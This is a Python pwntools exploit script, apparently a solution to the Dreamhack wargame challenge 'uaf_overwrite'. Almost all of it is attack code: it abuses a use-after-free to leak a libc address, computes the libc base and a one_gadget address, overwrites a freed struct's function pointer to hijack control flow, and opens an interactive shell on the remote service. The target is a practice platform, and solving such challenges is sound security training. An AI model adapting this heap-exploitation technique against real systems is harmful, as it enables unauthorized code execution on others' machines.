from pwn import *

p = remote('host3.dreamhack.games', 9570)
e = ELF('./uaf_overwrite')

def slog(sym, val):
    log.info(f'{sym} = {hex(val)}')

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

    p.recvuntil(b'Data: ')
    leak = p.recvuntil(b'\nFree idx: ', drop=True)

    p.sendline(str(idx).encode())
    return leak

custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)

leak = custom(0x500, b'B', -1)

log.info(f'raw leak = {leak}')

libc_leak = u64(leak[:6].ljust(8, b'\x00'))
libc_base = libc_leak - 0x3ebc42
one_gadget = libc_base + 0x10a41c

slog('libc_leak', libc_leak)
slog('libc_base', libc_base)
slog('one_gadget', one_gadget)

human(1, one_gadget)
robot(1)

p.interactive()